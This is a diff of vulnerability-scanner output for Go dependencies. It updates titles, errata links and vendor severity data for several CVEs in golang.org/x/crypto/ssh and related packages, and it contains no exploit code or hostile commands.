-│                       │      ├ Title           : golang.org/x/crypto/ssh: in golang.org/x/crypto/ssh 
+│                       │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of
+│                       │      │                   Service via unbounded memory consumption in GSSAPI
+│                       │      │                   authentication 
 │                       │      ├ Description     : SSH servers parsing GSSAPI authentication requests do not
 │                       │      │                   validate the number of mechanisms specified in the request,
 │                       │      │                   allowing an attacker to cause unbounded memory consumption. 
@@ -4178,11 +3990,11 @@
 │                       │      │                            │           L/A:L 
 │                       │      │                            ╰ V3Score : 7 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/08/06/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20983 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20909 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-47907 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2387083 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/2393152 
-│                       │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2025-20983.html 
+│                       │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2025-20909.html 
 │                       │      │                  ├ [6] : https://go.dev/cl/693735 
 │                       │      │                  ├ [7] : https://go.dev/issue/74831 
 │                       │      │                  ├ [8] : https://groups.google.com/g/golang-announce/c/x5MKroM
@@ -4237,14 +4049,14 @@
 │                       │      │                            │           N/A:H 
 │                       │      │                            ╰ V3Score : 7.5 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23295 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23326 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-58183 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2407258 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
 │                       │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       25-58183 
-│                       │      │                  ├ [6] : https://errata.almalinux.org/10/ALSA-2025-23295.html 
-│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23295 
+│                       │      │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-23326.html 
+│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23326 
 │                       │      │                  ├ [8] : https://go.dev/cl/709861 
 │                       │      │                  ├ [9] : https://go.dev/issue/75677 
 │                       │      │                  ├ [10]: https://groups.google.com/g/golang-announce/c/4Emdl2i
@@ -4284,9 +4096,10 @@
 │                       │      │                   actor can result in excessive resource consumption. 
 │                       │      ├ Severity        : HIGH 
 │                       │      ├ CweIDs           ─ [0]: CWE-295 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ├ bitnami: 3 
-│                       │      │                  ╰ redhat : 3 
+│                       │      ├ VendorSeverity   ╭ amazon     : 3 
+│                       │      │                  ├ bitnami    : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ╰ redhat     : 3 
 │                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │      │                  │         │           N/A:H 
 │                       │      │                  │         ╰ V3Score : 7.5 
@@ -4298,9 +4111,11 @@
 │                       │      │                  ├ [2]: https://go.dev/issue/76445 
 │                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/8FJoBkPd
 │                       │      │                  │      dm4 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
-│                       │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-4155 
-│                       │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
+│                       │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2025-61729.html 
+│                       │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-0923.html 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4155 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
 │                       │      ├ PublishedDate   : 2025-12-02T19:15:51.447Z 
 │                       │      ╰ LastModifiedDate: 2025-12-19T18:25:28.283Z 
 │                       ├ [8]  ╭ VulnerabilityID : CVE-2025-47906 
@@ -7250,8 +7065,8 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:d6626099c422d9cee01323a665ce66c375b259ba73206120997d0
 │                       │      │                   ebc72d8b3db 
-│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: in
-│                       │      │                   golang.org/x/crypto/ssh/agent 
+│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: SSH Agent servers: Denial of
+│                       │      │                   Service due to malformed messages 
 │                       │      ├ Description     : SSH Agent servers do not validate the size of messages when
 │                       │      │                   processing new identity requests, which may cause the
 │                       │      │                   program to panic if the message is malformed due to an out
@@ -7298,7 +7113,9 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:08b2a184d90b238b596ed76ec894ba89064c339c301cd7a80649a
 │                       │      │                   bc70897fc14 
-│                       │      ├ Title           : golang.org/x/crypto/ssh: in golang.org/x/crypto/ssh 
+│                       │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of
+│                       │      │                   Service via unbounded memory consumption in GSSAPI
+│                       │      │                   authentication 
 │                       │      ├ Description     : SSH servers parsing GSSAPI authentication requests do not
 │                       │      │                   validate the number of mechanisms specified in the request,
 │                       │      │                   allowing an attacker to cause unbounded memory consumption. 
@@ -7372,11 +7189,11 @@
 │                       │      │                            │           L/A:L 
 │                       │      │                            ╰ V3Score : 7 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/08/06/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20983 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20909 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-47907 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2387083 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/2393152 
-│                       │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2025-20983.html 
+│                       │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2025-20909.html 
 │                       │      │                  ├ [6] : https://go.dev/cl/693735 
 │                       │      │                  ├ [7] : https://go.dev/issue/74831 
 │                       │      │                  ├ [8] : https://groups.google.com/g/golang-announce/c/x5MKroM
@@ -7431,14 +7248,14 @@
 │                       │      │                            │           N/A:H 
 │                       │      │                            ╰ V3Score : 7.5 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23295 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23326 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-58183 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2407258 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
 │                       │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       25-58183 
-│                       │      │                  ├ [6] : https://errata.almalinux.org/10/ALSA-2025-23295.html 
-│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23295 
+│                       │      │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-23326.html 
+│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23326 
 │                       │      │                  ├ [8] : https://go.dev/cl/709861 
 │                       │      │                  ├ [9] : https://go.dev/issue/75677 
 │                       │      │                  ├ [10]: https://groups.google.com/g/golang-announce/c/4Emdl2i
@@ -7478,9 +7295,10 @@
 │                       │      │                   actor can result in excessive resource consumption. 
 │                       │      ├ Severity        : HIGH 
 │                       │      ├ CweIDs           ─ [0]: CWE-295 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ├ bitnami: 3 
-│                       │      │                  ╰ redhat : 3 
+│                       │      ├ VendorSeverity   ╭ amazon     : 3 
+│                       │      │                  ├ bitnami    : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ╰ redhat     : 3 
 │                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │      │                  │         │           N/A:H 
 │                       │      │                  │         ╰ V3Score : 7.5 
@@ -7492,9 +7310,11 @@
 │                       │      │                  ├ [2]: https://go.dev/issue/76445 
 │                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/8FJoBkPd
 │                       │      │                  │      dm4 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
-│                       │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-4155 
-│                       │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
+│                       │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2025-61729.html 
+│                       │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-0923.html 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4155 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
 │                       │      ├ PublishedDate   : 2025-12-02T19:15:51.447Z 
 │                       │      ╰ LastModifiedDate: 2025-12-19T18:25:28.283Z 
 │                       ├ [8]  ╭ VulnerabilityID : CVE-2025-47906 
@@ -15450,8 +15270,8 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:10e1b4ac96ab6542d8b7d7522d68e0b5be50cfc687da31d0e0cf2
 │                       │      │                   febe6703e8e 
-│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: in
-│                       │      │                   golang.org/x/crypto/ssh/agent 
+│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: SSH Agent servers: Denial of
+│                       │      │                   Service due to malformed messages 
 │                       │      ├ Description     : SSH Agent servers do not validate the size of messages when
 │                       │      │                   processing new identity requests, which may cause the
 │                       │      │                   program to panic if the message is malformed due to an out
@@ -15498,7 +15318,9 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:6a913d7f356953613dc9417f48491aa19f68a50d66c1c9b8bebe6
 │                       │      │                   a7bc57c0b6d 
-│                       │      ├ Title           : golang.org/x/crypto/ssh: in golang.org/x/crypto/ssh 
+│                       │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of
+│                       │      │                   Service via unbounded memory consumption in GSSAPI
+│                       │      │                   authentication 
 │                       │      ├ Description     : SSH servers parsing GSSAPI authentication requests do not
 │                       │      │                   validate the number of mechanisms specified in the request,
 │                       │      │                   allowing an attacker to cause unbounded memory consumption. 
@@ -15572,11 +15394,11 @@
 │                       │      │                            │           L/A:L 
 │                       │      │                            ╰ V3Score : 7 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/08/06/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20983 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20909 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-47907 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2387083 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/2393152 
-│                       │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2025-20983.html 
+│                       │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2025-20909.html 
 │                       │      │                  ├ [6] : https://go.dev/cl/693735 
 │                       │      │                  ├ [7] : https://go.dev/issue/74831 
 │                       │      │                  ├ [8] : https://groups.google.com/g/golang-announce/c/x5MKroM
@@ -15631,14 +15453,14 @@
 │                       │      │                            │           N/A:H 
 │                       │      │                            ╰ V3Score : 7.5 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23295 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23326 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-58183 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2407258 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
 │                       │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       25-58183 
-│                       │      │                  ├ [6] : https://errata.almalinux.org/10/ALSA-2025-23295.html 
-│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23295 
+│                       │      │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-23326.html 
+│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23326 
 │                       │      │                  ├ [8] : https://go.dev/cl/709861 
 │                       │      │                  ├ [9] : https://go.dev/issue/75677 
 │                       │      │                  ├ [10]: https://groups.google.com/g/golang-announce/c/4Emdl2i
@@ -15678,9 +15500,10 @@
 │                       │      │                   actor can result in excessive resource consumption. 
 │                       │      ├ Severity        : HIGH 
 │                       │      ├ CweIDs           ─ [0]: CWE-295 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ├ bitnami: 3 
-│                       │      │                  ╰ redhat : 3 
+│                       │      ├ VendorSeverity   ╭ amazon     : 3 
+│                       │      │                  ├ bitnami    : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ╰ redhat     : 3 
 │                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │      │                  │         │           N/A:H 
 │                       │      │                  │         ╰ V3Score : 7.5 
@@ -15692,9 +15515,11 @@
 │                       │      │                  ├ [2]: https://go.dev/issue/76445 
 │                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/8FJoBkPd
 │                       │      │                  │      dm4 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
-│                       │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-4155 
-│                       │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
+│                       │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2025-61729.html 
+│                       │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-0923.html 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4155 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
 │                       │      ├ PublishedDate   : 2025-12-02T19:15:51.447Z 
 │                       │      ╰ LastModifiedDate: 2025-12-19T18:25:28.283Z 
 │                       ├ [32] ╭ VulnerabilityID : CVE-2025-47906 
@@ -18054,11 +17879,11 @@
 │                       │      │                            │           L/A:L 
 │                       │      │                            ╰ V3Score : 7 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/08/06/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20983 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20909 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-47907 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2387083 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/2393152 
-│                       │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2025-20983.html 
+│                       │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2025-20909.html 
 │                       │      │                  ├ [6] : https://go.dev/cl/693735 
 │                       │      │                  ├ [7] : https://go.dev/issue/74831 
 │                       │      │                  ├ [8] : https://groups.google.com/g/golang-announce/c/x5MKroM
@@ -18113,14 +17938,14 @@
 │                       │      │                            │           N/A:H 
 │                       │      │                            ╰ V3Score : 7.5 
 │                       │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/10/08/1 
-│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23295 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23326 
 │                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-58183 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2407258 
 │                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
 │                       │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       25-58183 
-│                       │      │                  ├ [6] : https://errata.almalinux.org/10/ALSA-2025-23295.html 
-│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23295 
+│                       │      │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-23326.html 
+│                       │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23326 
 │                       │      │                  ├ [8] : https://go.dev/cl/709861 
 │                       │      │                  ├ [9] : https://go.dev/issue/75677 
 │                       │      │                  ├ [10]: https://groups.google.com/g/golang-announce/c/4Emdl2i
@@ -18160,9 +17985,10 @@
 │                       │      │                   actor can result in excessive resource consumption. 
 │                       │      ├ Severity        : HIGH 
 │                       │      ├ CweIDs           ─ [0]: CWE-295 
-│                       │      ├ VendorSeverity   ╭ amazon : 3 
-│                       │      │                  ├ bitnami: 3 
-│                       │      │                  ╰ redhat : 3 
+│                       │      ├ VendorSeverity   ╭ amazon     : 3 
+│                       │      │                  ├ bitnami    : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ╰ redhat     : 3 
 │                       │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
 │                       │      │                  │         │           N/A:H 
 │                       │      │                  │         ╰ V3Score : 7.5 
@@ -18174,9 +18000,11 @@
 │                       │      │                  ├ [2]: https://go.dev/issue/76445 
 │                       │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/8FJoBkPd
 │                       │      │                  │      dm4 
-│                       │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
-│                       │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-4155 
-│                       │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
+│                       │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2025-61729.html 
+│                       │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-0923.html 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
+│                       │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4155 
+│                       │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
 │                       │      ├ PublishedDate   : 2025-12-02T19:15:51.447Z 
 │                       │      ╰ LastModifiedDate: 2025-12-19T18:25:28.283Z 
 │                       ├ [28] ╭ VulnerabilityID : CVE-2025-47906 
@@ -20536,11 +20364,11 @@
                         │      │                            │           L/A:L 
                         │      │                            ╰ V3Score : 7 
                         │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/08/06/1 
-                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20983 
+                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:20909 
                         │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-47907 
                         │      │                  ├ [3] : https://bugzilla.redhat.com/2387083 
                         │      │                  ├ [4] : https://bugzilla.redhat.com/2393152 
-                        │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2025-20983.html 
+                        │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2025-20909.html 
                         │      │                  ├ [6] : https://go.dev/cl/693735 
                         │      │                  ├ [7] : https://go.dev/issue/74831 
                         │      │                  ├ [8] : https://groups.google.com/g/golang-announce/c/x5MKroM
@@ -20595,14 +20423,14 @@
                         │      │                            │           N/A:H 
                         │      │                            ╰ V3Score : 7.5 
                         │      ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/10/08/1 
-                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23295 
+                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:23326 
                         │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-58183 
                         │      │                  ├ [3] : https://bugzilla.redhat.com/2407258 
                         │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
                         │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                         │      │                  │       25-58183 
-                        │      │                  ├ [6] : https://errata.almalinux.org/10/ALSA-2025-23295.html 
-                        │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23295 
+                        │      │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-23326.html 
+                        │      │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:23326 
                         │      │                  ├ [8] : https://go.dev/cl/709861 
                         │      │                  ├ [9] : https://go.dev/issue/75677 
                         │      │                  ├ [10]: https://groups.google.com/g/golang-announce/c/4Emdl2i
@@ -20642,9 +20470,10 @@
                         │      │                   actor can result in excessive resource consumption. 
                         │      ├ Severity        : HIGH 
                         │      ├ CweIDs           ─ [0]: CWE-295 
-                        │      ├ VendorSeverity   ╭ amazon : 3 
-                        │      │                  ├ bitnami: 3 
-                        │      │                  ╰ redhat : 3 
+                        │      ├ VendorSeverity   ╭ amazon     : 3 
+                        │      │                  ├ bitnami    : 3 
+                        │      │                  ├ oracle-oval: 3 
+                        │      │                  ╰ redhat     : 3 
                         │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                         │      │                  │         │           N/A:H 
                         │      │                  │         ╰ V3Score : 7.5 
@@ -20656,9 +20485,11 @@
                         │      │                  ├ [2]: https://go.dev/issue/76445 
                         │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/8FJoBkPd
                         │      │                  │      dm4 
-                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
-                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-4155 
-                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
+                        │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2025-61729.html 
+                        │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-0923.html 
+                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-61729 
+                        │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2025-4155 
+                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2025-61729 
                         │      ├ PublishedDate   : 2025-12-02T19:15:51.447Z 
                         │      ╰ LastModifiedDate: 2025-12-19T18:25:28.283Z 
                         ├ [28] ╭ VulnerabilityID : CVE-2025-47906 
